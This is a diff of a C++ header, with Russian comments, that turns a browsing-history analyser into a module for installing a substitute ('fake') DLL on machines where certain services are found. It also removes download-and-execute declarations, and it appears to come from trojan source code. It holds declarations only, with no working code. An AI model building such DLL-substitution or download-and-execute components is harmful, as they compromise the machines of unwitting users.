@@ -1,12 +1,16 @@
 //---------------------------------------------------------------------------
 //
-//   Модуль анализа истории посещения пользователем интернет ресурсов
-//   и принятия решения на основе результата
+//  Модуль инсталяции подставной DLL (Fake DLL)
+//
+//  Модуль ищет на компьютере следы необходимых
+//  сервисов и, в случае нахождения, выполняет
+//  команду установки подставной длл
+//
 //
 //---------------------------------------------------------------------------
 
-#ifndef HistoryAnalizerH
-#define HistoryAnalizerH
+#ifndef FakeDllInstallerH
+#define FakeDllInstallerH
 
 //---------------------------------------------------------------------------
 #include <windows.h>
@@ -40,36 +44,12 @@ typedef struct THistoryConfig
 } *PHistoryConfig;
 
 
-namespace HisAnalizer
+namespace FKI
 {
-/*
-	//  Загрузить конфигурационный файл анализатора
-	bool Download(PCHAR URL, PHistoryConfig &Config);
-
-	//  Распарсить строки конфигурационного файла
-	bool Parse(PCHAR Lines, PHistoryConfig Config);
-
-	//  Произвести анализ истории и выполнить необходимую команду
-	void Execute(PHistoryConfig Config);
-
-	//  Загрузить и выполнить команду из конфигурационного файла
-    void DownloadAndExecute(PCHAR URL);
-
-	//  Очистить конфиг
-	void ClearConfig(PHistoryConfig Config);
-
-	// Уничтожить конфиг
-	void FreeConfig(PHistoryConfig Config);
-
-    // Запустить загрузку и выполнение анализатора истории в отдельном потоке
-	void StartAnalizerThread(PCHAR URL);
-*/
-
 	//------------------------------------------------------
 	// Execute - Фуекция запускает анализ истории навигации
 	//------------------------------------------------------
 	void Execute();
-
 }
 
 
